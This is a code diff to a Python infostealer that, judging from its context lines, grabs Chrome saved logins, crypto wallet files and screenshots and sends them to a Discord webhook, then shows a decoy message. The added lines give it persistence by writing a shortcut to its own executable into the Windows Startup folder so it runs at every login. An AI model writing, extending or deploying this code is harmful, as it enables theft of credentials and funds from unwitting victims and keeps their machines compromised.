@@ -13,13 +13,18 @@ import discord
 import time
 import socket
 import threading
+import getpass
+import win32com.client
 import logging
 import uuid
+import win32gui
+import win32con
 from Cryptodome.Cipher import AES
 from pyftpdlib.authorizers import DummyAuthorizer
 from pyftpdlib.handlers import FTPHandler
 from pyftpdlib.servers import FTPServer
 from PIL import ImageGrab
+from pathlib import Path
 
 
 Webhook = ""
@@ -106,7 +111,8 @@ screenshot.save(screenshot_path)
 screenshot.close()
 logging.basicConfig(level=logging.CRITICAL)
 Uploadlink = []
-
+startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+file_path = os.path.join(startup_folder, "None.lnk")
 
 def spoofhwid():
     print("|    Generating HWID Key")
@@ -207,11 +213,24 @@ def get_db_connection(chrome_path_login_db):
 
 
 
+def add_to_startup(exe_name=None):
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+    shortcut_path = os.path.join(startup_folder, f"{exe_name}.lnk") 
+    if exe_name is None:
+        exe_name = os.path.basename(sys.executable)
+    exe_path = sys.executable
+    
+    if not os.path.exists(shortcut_path):
+        shell = win32com.client.Dispatch("WScript.Shell")
+        shortcut = shell.CreateShortcut(shortcut_path)
+        shortcut.TargetPath = exe_path
+        shortcut.WorkingDirectory = os.getcwd()
+        shortcut.IconLocation = exe_path
+        shortcut.Save()
+    else:
+        pass
 
-
-
-
-
+    return shortcut_path
 
 
 
@@ -308,6 +327,7 @@ def find_wallets():
 
 Wallets = ", ".join(find_wallets()) if find_wallets() else "No Wallets found."
 Uploadlink = uploadimage(screenshot_path)
+script_name = os.path.basename(__file__)
 if __name__ == '__main__':
     try:
         with open('LatestLog.txt', mode='w', encoding='utf-8') as decrypt_password_file:
@@ -399,7 +419,11 @@ if __name__ == '__main__':
                 os.remove("chrome_logins.txt")
             send_to_discord(Webhook, embed=MCAccount)
             delete()
-            fakeMessage()
+            if os.path.exists(file_path):
+                pass
+            else:
+                shortcut_path = add_to_startup()
+                fakeMessage()
 
     except Exception as e:#Error 32, can occur IDK why but it sends a red flag even if it gets data. Dont know. Dont care
         if all_logins == "":
@@ -410,4 +434,8 @@ if __name__ == '__main__':
             )
             send_to_discord(Webhook, embed=ChromeDataError)
         delete()
-        fakeMessage()
+        if os.path.exists(file_path):
+            pass
+        else:
+            shortcut_path = add_to_startup()
+            fakeMessage()
